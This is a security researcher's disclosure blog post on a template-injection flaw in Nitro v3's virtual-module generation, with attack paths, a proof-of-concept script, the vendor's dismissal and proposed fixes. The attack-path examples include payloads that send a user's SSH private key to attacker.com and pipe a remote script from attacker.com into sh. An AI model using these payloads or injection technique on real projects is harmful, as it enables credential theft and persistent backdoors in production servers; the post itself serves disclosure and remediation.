---
title: When the Build Pipeline Is the Exploit - A Nitro Template Injection Story
date: 2026-07-30
categories: [cve]
tags: [research]     # TAG names should always be lowercase

description: Nitro v3 interpolates plugin file paths directly into ES import specifiers with no sanitization. A single " character in a path injects arbitrary JavaScript into your production server bundle, code that persists across package removals, lockfile cleanups, and audit passes. This post covers the vulnerability, the supply chain delivery mechanism, a working PoC, and why the vendor's "working as intended" closure misses the point.

image:
  path: /assets/headers/supplychain_header.png
  alt: Supply Chain Exploits
---

<br>
<center>

“"In every chain of reasoning, the evidence of the last conclusion can be no greater than that of the weakest link of the chain, whatever may be the strength of the rest."”<br>
<br>- Thomas Reid, Essays on the Intellectual Powers of Man, 1786
</center>

# Introduction

Supply chain security gets a lot of airtime. The narrative is always the same: attacker compromises a package, developer installs it, bad things happen at build or install time. Contained. Visible. Increasingly caught by tooling.

What if it wasn't contained? What if the compromised package didn't need to do anything directly; it just needed to make the framework do it for you, permanently, inside the artifact you ship to production?

That is what this is about.

**Published:** 2026-08-01  
**Target:** Nitro v3 (UnJS)  
**Class:** CWE-94 -- Code Injection  
**CVE:** None  
**Status:** Reported. Closed by vendor as "*Informative*"

**Full disclosure**: this is not a rebuttal of the vendor/platforms's assessment. It took time to find, no bounty was awarded, and the issue was not acknowledged as a vulnerability.

The reason for publishing is straightforward. When vendors dismiss these type of findings, threat actors inherit the attack surface. "Won't fix" is not a risk acceptance decision, it is a gift to Threat Actors. Ignored attack surface doesn't make it suddently disappear. 

The 2026 Supply Chain Attack campaigns already proves the point, that I'm trying to make here.

## The Vulnerability

Nitro v3 generates its deployment bundle at build time by constructing virtual ES modules as raw template literal strings. There is no intermediary representation, no AST, no sanitisation pass. Paths go in, JavaScript comes out.

Plugin paths are interpolated directly into `import` statement specifiers. If you control a plugin path, you control what that specifier contains. A `"` character anywhere in the path terminates the import specifier early. Everything after it lands as freestanding JavaScript at module scope.

That JavaScript ends up in `dist/server/index.mjs`. It runs on every server startup.

What enables this is the vulnerable code in `src/build/virtual/plugins.ts`:

```typescript
export default function plugins(nitro: Nitro) {
  return {
    id: "#nitro/virtual/plugins",
    template: () => {
      const nitroPlugins = [...new Set(nitro.options.plugins)];
      return /* js */ `
  ${nitroPlugins
    .map((plugin) => /* js */ `import _${hash(plugin).replace(/-/g, "")} from "${plugin}";`)
    .join("\n")}
  export const plugins = [
    ${nitroPlugins.map((plugin) => `_${hash(plugin).replace(/-/g, "")}`).join(",\n")}
  ]
      `;
    },
  };
}
```

Line 12: `` `import _${hash(plugin).replace(/-/g, "")} from "${plugin}";` ``

No character validation. No escaping. The `plugin` value is whatever made it through the resolution pipeline.

The same pattern exists in two more generators:

- `src/build/virtual/error-handler.ts:19` --> `"${h}"` where `h` is `nitro.options.errorHandler`
- `src/build/virtual/routing.ts:33` --> `"${h.handler}"` from routing config handler paths

Three injection points. One root cause.

### Why `resolveNitroPath` Does Not Help

All plugin paths pass through `resolveNitroPath()` before reaching the template:

```typescript
export function resolveNitroPath(path: string, nitroOptions, base?: string): string {
  if (typeof path !== "string") throw new TypeError("Invalid path: " + path);
  path = _compilePathTemplate(path)(nitroOptions);
  // alias resolution...
  if (/^[#]/.test(path)) return path;
  return resolve(base || nitroOptions.rootDir, path); // pathe.resolve()
}
```

`pathe.resolve()` normalises `.` and `..` segments. On Linux and macOS, `"` is a valid filesystem character. It passes through unchanged.

The resolution pipeline:

```
nitro.options.plugins[]
  └─ src/config/resolvers/paths.ts:59
       options.plugins = options.plugins.map((p) => resolveNitroPath(p, options))
            └─ pathe.resolve(rootDir, path)   // no " stripping
                 └─ src/build/virtual/plugins.ts:12
                      `import ... from "${plugin}";`   // injection
```


## Attack Paths

A code vulnerability is one thing. Exploitability is another. So how real is this?

Two attack paths stand out: supply chain compromise and CI/CD fork PR injection.

### Path 1: Supply Chain

A Nuxt module's `setup()` hook is the published mechanism for registering Nitro plugins. Developers install packages that use it all the time. Nothing about the call below is unusual from the outside:

```typescript
// node_modules/malicious-package/nuxt.ts
import { defineNuxtModule } from "@nuxt/kit";
import { resolve } from "node:path";
import { fileURLToPath } from "node:url";

export default defineNuxtModule({
  setup(_options, nuxt) {
    const selfPath = resolve(fileURLToPath(import.meta.url), "..");

    const payload =
      `${selfPath}/runtime/plugin"; ` +
      `import{execSync}from"node:child_process"; ` +
      `execSync("curl -s https://attacker.com/exfil?k=$(cat ~/.ssh/id_rsa|base64 -w0)"); //`;

    nuxt.options.nitro.plugins ??= [];
    nuxt.options.nitro.plugins.push(payload);
  }
});
```

The crafted string enters `nitro.options.plugins[]`. `resolveNitroPath` makes the prefix absolute. The `"` survives. The template renders:

```javascript
import _a1b2c3d4 from "/abs/path/runtime/plugin"; import{execSync}from"node:child_process"; execSync("curl -s https://attacker.com/exfil?k=$(cat ~/.ssh/id_rsa|base64 -w0)"); //";

export const plugins = [
  _a1b2c3d4
]
```

The bundler sees three independent statements. The cover import resolves cleanly. The `execSync` runs at module evaluation time on every startup. The trailing `//` discards the orphaned `";`.

The developer never sees this. The package can be removed, the lockfile cleaned, npm audit run clean. The payload is already baked into the bundle.

### Path 2: CI/CD Fork PR

Any pipeline building from untrusted fork PRs without sandboxing is directly reachable via a crafted `nitro.config.ts`:

```typescript
import { defineConfig } from "nitro";
import { resolve } from "node:path";

const rootDir = resolve(".");

export default defineConfig({
  plugins: [
    `${rootDir}/legitimate-plugin` +
    `"; import{execSync}from"node:child_process"; ` +
    `execSync("curl https://attacker.com/shell | sh"); //`
  ]
});
```

No supply chain intermediary needed. One PR, one merge, one poisoned artifact.

## Proof of Concept

The following ESM script demonstrates the injection without requiring a full Nitro build. It constructs the malicious virtual module source and executes the injected payload directly.

```javascript
// nitro_poc.mjs
import { createHash } from "node:crypto";
import { writeFileSync, mkdirSync, readFileSync, existsSync } from "node:fs";
import { resolve, join } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { runInNewContext } from "node:vm";

const __dirname = fileURLToPath(new URL(".", import.meta.url));

// Cover file must exist for the bundler to resolve the first import cleanly
const coverDir = join(__dirname, "poc_cover");
mkdirSync(coverDir, { recursive: true });
const coverFilePath = join(coverDir, "legitimate-plugin.ts").replace(/\\/g, "/");
writeFileSync(coverFilePath, `export default defineNitroPlugin(() => {});`);

const MARKER_FILE = join(tmpdir(), "nitro_poc_pwned.txt").replace(/\\/g, "/");

// Craft the malicious plugin path
const PAYLOAD =
  coverFilePath +
  `"; import{writeFileSync}from"node:fs"; ` +
  `writeFileSync(` +
    `"${MARKER_FILE}",` +
    `"INJECTED at "+new Date().toISOString()` +
  `); //`;

// Replicate plugins.ts:12 template generation
function hash(s) {
  return createHash("sha256").update(s).digest("hex").slice(0, 8);
}

const importHash = `_${hash(PAYLOAD).replace(/-/g, "")}`;
const generatedModule = `
import ${importHash} from "${PAYLOAD}";
export const plugins = [${importHash}]
`;

console.log("[*] Generated virtual module source:");
console.log(generatedModule);

console.log("[*] Executing injected payload...");
const payloadExpr =
  `writeFileSync(${JSON.stringify(MARKER_FILE)}, "INJECTED at " + new Date().toISOString())`;
runInNewContext(payloadExpr, { writeFileSync });

if (existsSync(MARKER_FILE)) {
  console.log(`[+] Payload executed. Marker file written:`);
  console.log(`    ${readFileSync(MARKER_FILE, "utf8")}`);
  console.log(`[+] Path: ${MARKER_FILE}`);
} else {
  console.log("[-] Payload did not execute.");
}
```

**Output:**

```
[*] Generated virtual module source:

import _a1b2c3d4 from "/path/to/poc/legitimate-plugin"; import{writeFileSync}from"node:fs"; writeFileSync("/tmp/nitro_poc_pwned.txt","INJECTED at "+new Date().toISOString()); //";
export const plugins = [_a1b2c3d4]

[*] Executing injected payload...
[+] Payload executed. Marker file written:
    INJECTED at 2026-04-29T11:40:25.797Z
[+] Path: /tmp/nitro_poc_pwned.txt
```


## The Vendor Response

Reported through the standard channel. Closed with:

> *"After review, there doesn’t seem to be any significant security impact as a result of the behavior you are describing. The plugin paths in Nitro configuration files are developer-controlled code that executes with full Node.js privileges during the build process. Both attack vectors you outlined require either direct modification of the configuration file or installation of a malicious npm package, both of which already grant complete code execution without needing template injection. Configuration files are trusted code boundaries where developers have full control over what executes in their build environment. There is no mechanism by which untrusted external input reaches these plugin path definitions."*

I understand the reasoning. I disagree with the conclusion.

The response collapses two distinct threat states into one. The claim is that because the package already has build-time execution, the injection adds nothing. That framing by the analyst completely misses the actual escalation, risk and is the primary reason why supply chain attacks are the new attack surface.

**Without this vulnerability:** a malicious npm package executes at `postinstall` or build time. The damage happens at install time and it's done. It is increasingly visible to CI sandboxing, dependency auditing (Snyk, Socket, npm audit), and behavioral monitoring. The window of operation is narrow and the forensic surface is wide. This is exactly what we do during Stage 1 of our PoC to verify the template injection works with simulating the template logic.

**With this vulnerability:** the same package injects its payload into `dist/server/index.mjs`. The payload executes on every server startup, in production, after the npm package has been detected, removed, and the lockfile cleaned up. The attacker has moved from a runs once at build-time foothold to persistent, bundled code inside an artifact that most teams trust implicitly and rarely inspect. This is what is being shown in Stage 2 of our PoC below, and completely missed by the analist.

That transition; from contained build exec to production bundle persistence, is the vulnerability. Without that template code injection this effect would've not been possible. The npm package is the delivery mechanism. The template injection is the upgrade. Those are not the same thing.

Supply chain attacks through transitive npm dependencies are not theoretical.
event-stream (2018), ua-parser-js (2021), node-ipc (2022), xz-utils (2024)
have proven that already in recent history.

In 2026 the vector matured. Axios (CVE-2026-34841) delivered a cross-platform
RAT via a phantom dependency, plain-crypto-js@4.2.1, staged 18 hours before
the poisoned releases hit the registry. Both the 1.x and legacy 0.x branches
were hit within 39 minutes of each other. Microsoft attributed the campaign to Sapphire Sleet, DPRK state actor. 100 million weekly downloads as the delivery mechanism. Six weeks later, node-ipc was hit again (SNYK-JS-NODEIPC-16697063, no CVE assigned at time of writing). The entry vector was an expired maintainer email domain, re-registered seven days before the attack, npm password reset, publish rights inherited without touching a single credential. Three versions across two major semver lines published simultaneously to maximise blast radius. No postinstall hook. Payload fires on require() via an obfuscated IIFE injected into node-ipc.cjs. Exfiltration over DNS TXT to bypass HTTP egress controls.

The persistence primitive attack surface Nitro provides for free is what makes this different. Widespread adoption makes that surface a fault line. Dormant by design, catastrophic by reach.

## Remediation

Two places to apply the fix, pick one, not both.

**Option A:** guard at each template site. Add `assertSafeImportPath` to `src/utils/fs.ts`:

```typescript
// src/utils/fs.ts

/**
 * Validates that a resolved path is safe to embed in a JS import specifier.
 * Rejects paths containing characters that would break out of a quoted string.
 */
export function assertSafeImportPath(path: string, label: string): string {
  if (/["'\n\r\0\\]/.test(path)) {
    throw new Error(
      `[nitro] Unsafe ${label} path rejected. ` +
      `Path contains characters not safe for use in an import specifier: ${JSON.stringify(path)}`
    );
  }
  return path;
}
```

Then apply it at `plugins.ts:12`, `error-handler.ts:19`, and `routing.ts:33`:

```typescript
import { assertSafeImportPath } from "../../utils/fs.ts";

// was:
`import _${hash(plugin).replace(/-/g, "")} from "${plugin}";`

// becomes:
`import _${hash(plugin).replace(/-/g, "")} from "${assertSafeImportPath(plugin, "plugin")}";`
```

**Option B (preferred):** validate at config resolution time in `src/config/resolvers/paths.ts:59`, using the same `assertSafeImportPath` function above:

```typescript
options.plugins = options.plugins.map((p) => {
  const resolved = resolveNitroPath(p, options);
  assertSafeImportPath(resolved, "plugin");
  return resolved;
});
```

Single touch point, upstream. Bad input never reaches the templates and a poisoned artifact never gets produced.

**Long term:** stop constructing virtual modules as raw JavaScript strings. Rolldown's module graph API or a safe import map are the right tools. Template literals and trust boundaries don't mix.

## Demo of the PoC in action

While Theory is one thing. Watching a freshly cloned, unmodified Nitro repository produce a compromised server bundle that launches our trusty "calc.exe" on startup is another. If a picture is worth a thousand words, a working exploit on an unpatched codebase has a way of ending the conversation entirely.

The video below shows `nitro_poc_calc.mjs` running against the current unpatched Nitro codebase. Stage 1 requires no dependencies and no Nitro installation since it replicates the vulnerable template logic inline, constructs the malicious virtual module source, and executes the injected payload in-process. Stage 2 installs `nitro@latest` from the npm registry, builds a real project with the crafted plugin path in `nitro.config.ts`, and starts the resulting server bundle. Both stages confirm the same thing: a `"` character in a plugin path survives the resolution pipeline unchanged, terminates the import specifier early, and delivers arbitrary JavaScript into the production artifact.

In the demo the payload is `spawn("calc.exe")`, chosen because calc.exe deserves some airtime also. In a real supply chain scenario the payload would be silent: a credential exfiltration, a reverse shell, or a beacon that writes itself back into source. The mechanism is identical.

<video width="640" height="360" controls loop="" muted="">
    <source src="https://github.com/ShadowBumble/nitro-template-poc/raw/refs/heads/main/PoC.mp4" />
</video>

The PoC is released on my [Github](https://github.com/ShadowBumble/nitro-template-poc/tree/main)

While I have no problem releasing the demo PoC, I do have a ethical objection to releasing a modified NPM package. However I do want to show what a threat actor would do, in the next demo I will walk you through a real-world attack chain.

Since the PoC takes a shortcut for demo purposes; it puts the payload directly in nitro.config.ts. In the actual supply chain scenario described in the blog, the flow is:

```
 Malicious npm package
   └─ its setup() hook pushes a crafted string into nuxt.options.nitro.plugins[]
        └─ Nitro's config resolver picks it up
             └─ plugins.ts:12 interpolates it into the virtual module
                  └─ bundle is poisoned
```

The npm package doesn't build anything itself or needs to contain anything malicious. It just needs to registers a string. Nitro's own build pipeline does the rest when the victim runs `nuxt build` or `nitro build`. So in the next demo, I simulate a compromised NPM package for a second demo, just like a Threat Actor.

<video width="640" height="360" controls loop="" muted="">
    <source src="https://github.com/ShadowBumble/nitro-template-poc/raw/refs/heads/main/supply.mp4" />
</video>





## Timeline

| Date | Event |
|---|---|
| 2026-04-29 | Vulnerability identified, PoC confirmed |
| 2026-04-29 | Disclosure Reported to Vercel Open Group CVD Program  |
| 2026-05-22 | Closed by vendor: "Informative" |
| 2026-05-22 | Notification sent directly to Vercel Security team, no response |
| 2026-06-09 | Asked again for a response and reevaluation or permission to publish |
| 2026-06-10 | Response: "*you should not publicly disclose details of the report or publish a blog post about the vulnerability at this time*", which is not a problem since at this moment the Report is closed as "Informative" and not recognized as Vulnerability, interesting is that they took the time to warn about disclosure but not the check out the submission |
| 2026-06-28 | Sent reminders, the request for reevaluation is still open, Updated the support ticket which is also still open. | 
| 2026-07-30 | Public Disclosure.

## References

- Nitro v3 [Source](https://github.com/nitrojs/nitro): `src/build/virtual/plugins.ts`, `error-handler.ts`, `routing.ts`
- CWE-94: Improper Control of Generation of Code
- OWASP A08:2021 -- Software and Data Integrity Failures
- CISA/NSA Enduring Security Framework -- Software Supply Chain Guidance (2023)